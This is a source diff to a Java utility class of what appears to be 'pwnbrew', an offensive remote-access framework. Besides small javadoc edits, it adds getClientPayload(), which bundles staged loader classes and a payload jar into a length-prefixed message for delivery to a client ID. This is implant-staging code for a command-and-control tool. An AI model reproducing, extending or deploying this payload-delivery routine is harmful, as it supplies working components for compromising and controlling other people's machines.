@@ -54,6 +54,7 @@ import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.nio.ByteBuffer;
 import java.security.*;
 import java.text.SimpleDateFormat;
 import java.util.*;
@@ -87,6 +88,8 @@ import pwnbrew.xmlBase.XmlBaseFactory;
 import pwnbrew.jna.Kernel32;
 import pwnbrew.misc.FileFilterImp;
 import pwnbrew.misc.RuntimeRunnable;
+import pwnbrew.network.control.messages.Payload;
+import pwnbrew.network.control.messages.SendStage;
 
 
 /**
@@ -142,6 +145,7 @@ public class Utilities {
     // ==========================================================================
     /**
      *  Add the Controller to the Runnable Controller list
+     * @param passedClassPath
      */
     public static void addRunnableController( String passedClassPath ) {
         if( passedClassPath != null && !passedClassPath.isEmpty() )
@@ -151,6 +155,7 @@ public class Utilities {
      // ==========================================================================
     /**
      *  Adds the class
+     * @param passedClassPath
      */
     public static void addOptionsJPanel( String passedClassPath ) {
         if( passedClassPath != null && !passedClassPath.isEmpty() )
@@ -589,6 +594,8 @@ public class Utilities {
     //============================================================
     /**
      * Loads the classes from the jar file into the classloader
+     * @param aJarFile
+     * @return 
     */
     public static List<Class<?>> loadJar(File aJarFile) {
         
@@ -1206,6 +1213,114 @@ public class Utilities {
      */
     public static FileFilterImp getFileFilter() {
         return null;
+    }
+    
+     //=========================================================================
+    /**
+     *  Get the client payload
+     * @param clientId
+     * @return 
+     */
+    public static Payload getClientPayload( int clientId ) {
+        
+        Payload aPayload = null;            
+        try{
+            
+            File payloadFile = Constants.PAYLOAD_PATH.toFile();
+            if( payloadFile.exists() ){
+
+                byte[] byteBuffer = new byte[Constants.GENERIC_BUFFER_SIZE];
+                String[] stagedClasses = new String[]{ 
+                    "pwnbrew/stage/Stage",
+                    "pwnbrew/stage/MemoryBufferURLConnection",
+                    "pwnbrew/stage/MemoryBufferURLStreamHandler",
+                    "pwnbrew/stage/Pwnbrew",
+                };
+
+                //Send each staged class
+                ByteBuffer classByteBuffer = ByteBuffer.allocate( (int) (payloadFile.length() + 10000));
+                for( String aClass : stagedClasses ){
+
+                    int bytesRead = 0;
+                    String thePath = aClass;             
+                    InputStream anIS = SendStage.class.getClassLoader().getResourceAsStream(thePath);
+
+                    //Read the bytes into a byte array
+                    ByteArrayOutputStream theBOS = new ByteArrayOutputStream();
+                    try {
+
+                        //Read to the end
+                        while( bytesRead != -1){
+                            bytesRead = anIS.read(byteBuffer);
+                            if(bytesRead != -1){
+                                theBOS.write(byteBuffer, 0, bytesRead);
+                            }
+                        }
+
+                        theBOS.flush();
+
+                    } finally {
+
+                        //Close output stream
+                        theBOS.close();
+                    }            
+
+                    //Queue up the classes to be sent
+                    byte[] tempArr = theBOS.toByteArray();
+                    byte[] theBytes = new byte[ tempArr.length + 4 ];
+
+                    byte[] classLen = SocketUtilities.intToByteArray(tempArr.length);
+                    System.arraycopy(classLen, 0, theBytes, 0, classLen.length); 
+                    System.arraycopy(tempArr, 0, theBytes, 4, tempArr.length);                
+
+                    //Queue the bytes
+                    classByteBuffer.put(theBytes);
+                    theBOS = null;
+
+                }
+
+                //Add file ending byte
+                classByteBuffer.put( new byte[]{ 0x0, 0x0, 0x0, 0x0});
+
+                //Add jar and jar length
+                FileInputStream anIS = new FileInputStream( payloadFile );
+                try {
+
+                    //Add the jar size
+                    byte[] jarSize = SocketUtilities.intToByteArray( (int)payloadFile.length() );
+                    classByteBuffer.put(jarSize);
+
+                    //Read the bytes into the byte buffer
+                    int bytesRead = 0;
+                    while( bytesRead != -1){
+                        bytesRead = anIS.read(byteBuffer);
+                        if(bytesRead != -1){
+                            classByteBuffer.put(byteBuffer, 0 , bytesRead );
+                        }
+                    }
+
+                } finally {
+
+                    try {
+                        anIS.close();
+                    } catch(IOException ex){
+
+                    }
+                }
+
+                //Queue the bytes
+                byte[] classBytes = Arrays.copyOf(classByteBuffer.array(), classByteBuffer.position());
+
+                //Create message and send
+                aPayload = new Payload( clientId, classBytes );
+
+            }
+            
+        } catch( IOException ex ){
+           Log.log(Level.SEVERE, NAME_Class, "getClientPayload()", ex.getMessage(), ex );
+        }
+        
+        return aPayload;
     }
    
 }
